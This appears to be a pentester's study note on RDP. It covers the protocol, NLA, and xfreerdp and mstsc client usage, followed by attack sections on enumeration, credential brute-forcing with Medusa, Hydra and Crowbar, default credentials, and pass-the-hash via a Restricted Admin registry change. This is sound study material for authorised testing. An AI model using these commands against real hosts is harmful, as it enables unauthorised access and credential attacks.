---
created: 2026-04-07
tags:
  - remote_access
  - network_services
  - over_the_network
color: "linear-gradient(45deg, #23d4fd 0%, #3a98f0 50%, #b721ff 100%)"
---
## RDP

>**[RDP (Remote Desktop Protocol)](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol) (Remote Desktop Protocol)** is a [Microsoft-proprietary](https://learn.microsoft.com/en-us/troubleshoot/windows-server/remote/understanding-remote-desktop-protocol) application-layer protocol that allows users to connect to and control another computer over a network connection via a graphical user interface.

- RDP is one of the most popular administrative tools, installed on Windows by default.
- In addition, it represents one of the most commonly exploited attack vectors.
### How RDP works (in a nutshell)

- RDP operates on a client-server model:
	- The **RDP client** initiates the connection.
	- The **RDP server** is the Windows machine accepting the connection and serving the remote session.

>[!important] By default, RDP listens listens on **TCP port `3389`**.
>- Starting with RDP 8.0 (Windows 8 / Server 2012), **UDP port `3389`** is also supported for performance acceleration.
>- When both protocols are available, **RDP prefers UDP** and falls back to TCP on failure.

- The protocol multiplexes multiple **virtual channels** within a single connection — these carry display data, audio, clipboard content, drive redirects, printer traffic and more. Each feature you see in an RDP session (file copy, audio playback) uses one of these channels under the hood.
- Beyond screen-and-keyboard, RDP supports:
	- **Clipboard sharing** — bidirectional copy-paste between client and server.
	- **Drive redirection** — mount local directories as network shares on the remote host.
	- **Printer redirection** — print from the remote session to a local printer.
	- **Port redirection** — tunnel arbitrary TCP connections through the RDP session.
	- **Audio redirection** — play remote audio locally or redirect local microphone to the server.
	- **32-bit color and dynamic resolution**.
#### RDP authentication and NLA

>**[Network Level Authentication (NLA)](https://en.wikipedia.org/wiki/Remote_Desktop_Services#Network_Level_Authentication)** is a security feature of RDP that requires users to authenticate themselves before a remote desktop session is established.

>[!note] Originally, before NLA, when a client connected to an RDP serer, this would load a full Windows login screen — meaning the server rendered a graphical session for *every incoming connection*, authenticated or not. This was exploitable (DoS, [BlueKeep](https://en.wikipedia.org/wiki/BlueKeep)), and NLA was a Microsoft's solution.

- When a client tries to connect to the server, NLA verifies user credentials using the **Credential Security Support provider (`CredSSP`)** protocol as part of the *initial connection negotiation*, before giving access to the remote server.
- This prevents the login screen from loading for unauthorized attempts and guarantees that only authenticated users can access the remote server.

>[!note] NLA is enabled by default on Windows Vista/Server 2008 and later.

>[!note]+ Besides `CredSSP`, RDP can use:
> - **Kerberos** — on domain-joined hosts, when KDC is reachable.
> - **NTLM** — fallback when Kerberos is unavailable; used for workgroup machines or cross-domain.
> - **Local accounts** — standalone, workgroup hosts.

## Connecting over RDP

- To connect to an RDP server from a Linux system, you can use [`xfreerdp`](https://www.freerdp.com/) or [`Remmina`](https://remmina.org/) (GUI).
- There's also an older [`rdesktop`](http://www.rdesktop.org/).

>[!note] See [`xfreerdp`](https://man.archlinux.org/man/extra/freerdp2/xfreerdp.1.en) and [`rdesktop`](https://man.archlinux.org/man/rdesktop.1) man pages. 

- Windows supports RDP natively — just double-clicking on an `.rdp` file in File Explorer starts up a connection. From CLI, you can use [`mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc).
### xfreerdp

>[`xfreerdp`](https://www.freerdp.com/) is an **X11 RDP client**, a part of the **FreeRDP project**, designed to connect to Windows Remote Desktop servers and other RDP-compatible systems from Linux and UNIX-like environments.

>[!tip]+
>If you're on Wayland, use [`wlfreerdp`](https://manpages.debian.org/testing/freerdp2-wayland/wlfreerdp.1.en.html).

- Basic login:

```bash
xfreerdp /v:<target> /u:<username> /p:<password>
```

+ With clipboard redirection:

```bash
xfreerdp /v:<target> /u:<username> /p:<password> +clipboard 
```

- With audio redirection:

```bash
xfreerdp /v:<target> /u:<username> /p:<password> /sound:<sys:alsa>
```

- With dynamic resolution:

```bash
xfreerdp /v:<target> /u:<username> /p:<password> /dynamic-resolution
```

- Clipboard + audio redirection + dynamic resolution:

```bash
xfreerdp /v:<target> /u:<username> /p:<password> /sound:sys:alsa
```

>[!interesting]- Linux audio backends and RDP audio redirection
>```bash
>/sound[:sys:<backend>,dev:<device>,...]
>```
>-  The `/sound` option enables **audio output redirection**: audio from the remote Windows machine -> plays on your local Linux machine. 
>- For example:
>```bash
>/sound:sys:alsa
>```
>- `/sound` -> enable audio redirection.
>- `sys:alsa` -> use **ALSA backend** on your Linux system. 
>
>An **audio backend** in Linux is the software layer responsible for handling audio playback and routing between applications and hardware.
>Common backends:
>- ALSA (`sys:alsa`) — Low-level Linux sound system (direct hardware access).
>- PulseAudio (`sys:pulse`) — PulseAudio sound server (most common on desktops); default on Ubuntu, Kali, etc.
>- PipeWire (`sys:pipewire`) — Modern replacement for PulseAudio (often compatible via `pulse`).
>
>`xfreerdp` supports multiple backends and **chooses PulseAudio** by default if available.
>```bash
>/sound
>```

- Drive redirection:

```bash
xfreerdp /v:<target> /u:<username> /p:<password> +clipboard /drive:loot,/tmp /dynamic-resolution /f
```

>[!interesting]+ Drive redirection
>```bash
>/drive:<name>,<local_path>
>```
>- The `/drive` option enables **drive redirection**. Your local files and directories appear inside the remote RDP session. 
>- Redirected drives will appear in `\\tsclient` (open Explorer and type `\\tsclient`) and `This PC` -> `Redirected drives and folders`.
>- For example:
>```bash
>/drive:home,/home/user
>```
>- This redirects your local `/home/user` directory to the remote RDP session as a drive named `home`.
>- Redirect everything (may be risky):
>```bash
>/drives
>```
>- Redirect only home directory:
>```bash
>/home-drive
>```

- Ignore certificate checks:

```bash
xfreerdp /v:<ip_address> /u:<username> /p:<password> /cert:ignore
```
#### Option reference 

- Core connection settings:

| Option                           | Description                                                                    |
| -------------------------------- | ------------------------------------------------------------------------------ |
| `/v:server[:port]`               | Specify the target RDP server hostname, IP address, or URL with optional port. |
| `/u:[[domain]user\|user@domain]` | Specify the username for authentication.                                       |
| `/p:password`                    | Specify the password for authentication (not shown in help but supported).     |
| `/d:domain`                      | Specify the authentication domain.                                             |
| `/port:port`                     | Specify the port if not included in `/v:` (implicit usage).                    |

- Authentication and session control:

| Option                    | Description                                                      |
| ------------------------- | ---------------------------------------------------------------- |
| `/admin` or `/console`    | Connect to the admin (console) session of the server.            |
| `+auth-only`              | Perform authentication without establishing a full session.      |
| `/auth-pkg-list:`         | Filter allowed authentication packages such as NTLM or Kerberos. |
| `-authentication`         | Disable authentication support (experimental).                   |
| `+credentials-delegation` | Enable credential delegation to the server.                      |
| `/assistance:password`    | Specify password for Remote Assistance sessions.                 |
| `/auto-request-control:`  | Automatically request control in Remote Assistance sessions.     |

- Re-connection & reliability:

| Option                                | Description                                               |
| ------------------------------------- | --------------------------------------------------------- |
| `+auto-reconnect`                     | Enables automatic reconnection on connection loss.        |
| `/auto-reconnect-max-retries:retries` | Sets maximum reconnection attempts (0 means unlimited).   |
| `/timeout:ms`                         | Adjusts connection timeout for high latency environments. |
- Display and graphics:

| Option                | Description                                                  |
| --------------------- | ------------------------------------------------------------ |
| `/f`                  | Enables fullscreen mode.                                     |
| `/w:width`            | Sets the window width.                                       |
| `/h:height`           | Sets the window height (implicit standard option).           |
| `+dynamic-resolution` | Enables dynamic resolution updates when resizing the window. |
| `/bpp:depth`          | Sets color depth in bits per pixel.                          |
| `+aero`               | Enables desktop composition (Aero).                          |
| `-wallpaper`          | Disables wallpaper rendering.                                |
| `-themes`             | Disables themes.                                             |
| `+window-drag`        | Enables full window drag behavior.                           |
| `/workarea`           | Uses available work area instead of full screen.             |
| `/decorations`        | Enables window decorations.                                  |
| `-decorations`        | Disables window decorations.                                 |

- Window & UI behavior:

| Option                 | Description                                        |
| ---------------------- | -------------------------------------------------- |
| `/t:title`             | Sets the window title.                             |
| `/wm-class:class-name` | Sets the window WM_CLASS property.                 |
| `/window-position:x,y` | Specifies window position.                         |
| `/floatbar`            | Controls floating toolbar visibility and behavior. |
| `/toggle-fullscreen`   | Enables fullscreen toggle via keyboard shortcut.   |

- Audio & multimedia:

| Option             | Description                               |
| ------------------ | ----------------------------------------- |
| `/audio-mode:mode` | Specifies audio output mode.              |
| `/video`           | Enables video optimized remoting channel. |

- Device & resource redirection:

| Option             | Description                                                   |
| ------------------ | ------------------------------------------------------------- |
| `/drive:name,path` | Redirects a local directory as a network share.               |
| `+drives`          | Redirects all mounted drives.                                 |
| `/clipboard:`      | Configures clipboard redirection behavior and direction.      |
| `/usb:`            | Redirects USB devices using vendor/product or bus addressing. |
| `/vc:channel`      | Creates a static virtual channel.                             |
| `/dvc:channel`     | Creates a dynamic virtual channel.                            |
- Clipboard & input:

| Option                  | Description                                       |
| ----------------------- | ------------------------------------------------- |
| `+unmap-buttons`        | Sends raw physical mouse button events to server. |
| `/echo`                 | Enables echo channel.                             |
| `/prevent-session-lock` | Prevents session locking by simulating activity.  |

- Security & encryption:

| Option                 | Description                                                                 |
| ---------------------- | --------------------------------------------------------------------------- |
| `/cert:`               | Controls certificate validation behavior (ignore, deny, tofu, fingerprint). |
| `-encryption`          | Disables encryption (experimental).                                         |
| `/encryption-methods:` | Specifies allowed RDP encryption methods (40, 56, 128, FIPS).               |
| `+fipsmode`            | Enables FIPS mode.                                                          |
| `/tls:`                | Configures TLS settings including ciphers and protocol versions.            |

- Performance:

| Option                           | Description                                               |
| -------------------------------- | --------------------------------------------------------- |
| `-compression` or `/compression` | Enables or disables compression.                          |
| `/compression-level:level`       | Sets compression level.                                   |
| `/cache:`                        | Configures bitmap, glyph, and offscreen caching behavior. |

>[!note] See [`xfreerdp — man pages`](https://man.archlinux.org/man/extra/freerdp/xfreerdp3.1.en)

### mstsc 

>[MSTSC (Microsoft Terminal Service Client)](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc) is a built-in command-line tool (`mstsc.exe`) in Windows used to launch the **Remote Desktop Protocol (RDP) client** for connecting to remote computers or services. 

- Syntax:

```powershell
mstsc.exe [<connectionfile>] [/v:<server>[:<port>]] [/g:<gateway>] [/admin] [/f <fullscreen>] [/w:<width> /h:<height>] [/public] [/multimon] [/l] [/restrictedadmin] [/remoteguard] [/prompt] [/shadow:<sessionid>] [/control] [/noconsentprompt]
mstsc.exe /edit <connectionfile>
```

- Basic connection:

```powershell
mstsc /v:<target>
```

- Specify custom port:

```powershell
mstsc /v:<target>:3389
```

- Full screen mode:

```powershell
mstsc /v:<target> /f
```

- Save connection settings to an `.rdp` file:

```bash
mstsc /v:target.com /save:connection.rdp
```

#### Option reference

| Parameter              | Description                                                                                                            |
| ---------------------- | ---------------------------------------------------------------------------------------------------------------------- |
| `<connection_file>`    | An `.rdp` connection file to use for the connection.                                                                   |
| `/v:<target>[:<port>]` | Specify the remote computer and optionally the port number to connect to.                                              |
| `/admin`               | Connect to a session for administering the server.                                                                     |
| `/f`                   | Full-screen mode.                                                                                                      |
| `/w:<width>`           | Specify width of the remote desktop window.                                                                            |
| `/h:<height>`          | Specify height of the remote desktop window.                                                                           |
| `/public`              | Runs remote desktop in public mode (passwords and bitmaps aren't cached).                                              |
| `/multimon`            | Configure the remote desktop services session monitor layout to be identical to the current client-side configuration. |
| `/prompt`              | Prompt for credentials when you connect to the remote PC.                                                              |
| `/?`                   | Display command help.                                                                                                  |

>[!note] See [`mstsc — Microsoft Learn`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc).
## Enumeration

### Nmap scanning

- Check default RDP ports and run version scan:

```bash
sudo nmap -sV -p 3389 <target>
```

> [!tip]+
> - Basic port scanning + version detection — in case you suspect non-standard ports:
> 
> ```bash
> sudo nmap -sV -p- <target>
> ```

- Run default RDP scripts:

```bash
sudo nmap -sV -sC -p 3389 <target>
```

- Run all RDP-related scripts:

```bash
nmap -p 3389 --script "rdp-*" <target>
```

>[!tip]+ Nmap RDP scripts
> 
> - List Nmap scripts for RDP:
> 
> ```bash
> ls -l /usr/share/nmap/scripts/*rdp*
> ```
> 

- Nmap RDP scripts:

| Script                                                                            | Categories          | Description                                                                                                                       |
| --------------------------------------------------------------------------------- | ------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
| [`rdp-enum-encryption`](https://nmap.org/nsedoc/scripts/rdp-enum-encryption.html) | `discovery`, `safe` | Determines supported RDP security layers and encryption levels by testing available protocols and ciphers.                        |
| [`rdp-ntlm-info`](https://nmap.org/nsedoc/scripts/rdp-ntlm-info.html)             | `discovery`, `safe` | Enumerates NTLM information from RDP services with `CredSSP` (NLA) enabled, including domain and OS details.                      |
| [`rdp-vuln-ms12-020`](https://nmap.org/nsedoc/scripts/rdp-vuln-ms12-020.html)     | `vuln`, `safe`      | Checks whether the target is vulnerable to the `MS12-020` RDP vulnerability, which may allow denial-of-service or code execution. |

- Determine supported encryption and retrieve NTLM information:

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <target>
```

- Check for `MS12-020`:

```bash
nmap -p 3389 --script rdp-enum-encryption,rdp-ntlm-info <target>
```

### User enumeration

- RDP provides different error messages for valid and invalid usernames. This can be used for username enumeration.

- Username enumeration using [`crowbar`](https://github.com/galkan/crowbar):

```bash
crowbar -b rdp -s <target>/32 -u users.txt -C /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

>[!note] `/32` is a network prefix of a single IP address. You can scan the entire network by providing its address and prefix. 

### Session enumeration

If you already have credentials or are on the same network, you can query active RDP sessions without connecting to one:

- List active sessions on a remote host (Windows):

```powershell
query user /server:<target>
```

- Shorter alias:

```bash
quser /server:<target>
```

- Equivalent with [`qwinsta`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/qwinsta):

```powershell
qwinsta /server:<target>
```

### RDP security check 

>[`rdp-sec-check`](https://github.com/CiscoCXSecurity/rdp-sec-check) is an Perl script designed to enumerate security settings of an RDP service. It was developed by [`CiscoCVSecurityLabs`](https://github.com/CiscoCXSecurity).

>[!warning] `rdp-sec-check` is quite old, so it doesn't check for more recent vulnerabilities. But it's still usable for basic security assessment (e.g., weak encryption, missing NLA, etc.).

```bash
perl ./rdp-sec-check.pl <target>
```
## Brute-forcing credentials

>[!note]+ Common credentials
> 
> ```bash
> Administrator:<blank>  
> Administrator:admin  
> Administrator:password  
> Administrator:Password123  
> admin:admin  
> user:user
> ```

- Medusa:

```bash
medusa -M rdp -h <target> -u admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -e ns
```

>[!note]+ Option breakdown
>- `-M`: Medusa mode (protocol).
>- `-h`: Target host.
>- `-n`: Target port.
>- `-u`: Username to test (`-U` to brute-force usernames, too).
>- `-P`: Password wordlist.
>- `-e n`: Check for empty passwords.
>- `-e s`: Check for passwords matching the username. 

- Hydra:

```bash
hydra -l admin -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt RDP://<target>
```

- Non-standard port:

```bash
hydra -L usernames.txt -P passwords.txt -s 2121 <target> rdp
```

>[!note]+ Option breakdown
>- `-l`: Username to test (`-L` to brute-force usernames, too).
>- `-P`: Password wordlist.
>- `-s`: Specify port the target service is listening on.
>- `rdp` or `rdp://`: Target protocol (RDP).

>[!note] RDP [[Password wordlists and default credentials]].

### Crowbar

>[`crowbar`](https://github.com/galkan/crowbar) is built specifically for services like RDP and handles NLA better than Hydra in some configurations.

- Password brute-force: 

```bash
crowbar -b rdp -s <target>/32 -u Administrator -C /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

- Username + password brute-force:

```bash
crowbar -b rdp -s <target>/32 -U users.txt -C /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
```

- Verbose output:

```bash
crowbar -b rdp -s <target>/32 -u administrator -C /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt -v
```

> [!note]+ **Option** breakdown
> - `-b rdp`: Target protocol.
> - `-s <CIDR>`: Target in CIDR notation — use `/32` for a single host.
> - `-u` / `-U`: Single username or file.
> - `-C`: Password file.
> - `-v`: Verbose output.
## Restricted Admin Mode and Pass-the-Hash attacks 

- **Restricted Admin Mode** is an RDP security feature introduced in Windows 8.1 and Server 2012 R2. 
- Instead of performing an interactive logon, the mode forces a **network logon**, which means the remote computer cannot store the user's credentials in memory.
- This prevents caching credentials, and therefore mitigates the risk of credential theft from compromised servers. 
- However, while it stops password caching, it enables **pass-the-hash attacks** against the RDP protocol itself (a funny way to mitigate a vulnerability — introduce a new one).

Given that **restricted admin mode** is enabled on the target server, and an NTLM hash at hand, you can perform a [[🛠️ Pass-the-Hash]] attack using `xfreerdp`:

```bash
xfreerdp /v:<target_ip_address> /u:<username> /pth:<NTLM_hash>
```

>[!example]+
> ```
> xfreerdp /v:10.129.203.12 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824 
> ```

- To enable Restricted Admin Mode on a target, you need to modify the registry (requires existing admin access):

```powershell
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

- Setting `DisableRestrictedAdmin` to `0` _enables_ Restricted Admin Mode. Once set, you can authenticate with an NTLM hash instead of a password.

![[disable_restricted_admin_rdp.png]]

## References and further reading

- [`RDP — Wikipedia`](https://en.wikipedia.org/wiki/Remote_Desktop_Protocol)
- [`Remote Desktop Penetration Testing (Port 3389) — Hacking Articles`](https://www.hackingarticles.in/remote-desktop-penetration-testing-port-3389/)
- [`3389 - Pentesting RDP — HackTricks`](https://web.archive.org/web/20250802225113/https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-rdp.html)


- [`Port 3389 | RDP — Pentest Everything`](https://viperone.gitbook.io/pentest-everything/everything/ports/port-3389-or-rdp)
- [`RDP (Remote Dektop Protocol) — Hackviser`](https://hackviser.com/tactics/pentesting/services/rdp)

To be done:

- RDP session hijacking (post-exploitation)
- CVEs
	- `BlueKeep`
	- `DejaBlue`
	- `MS12-020` (DoS)
- Pivoting through RDP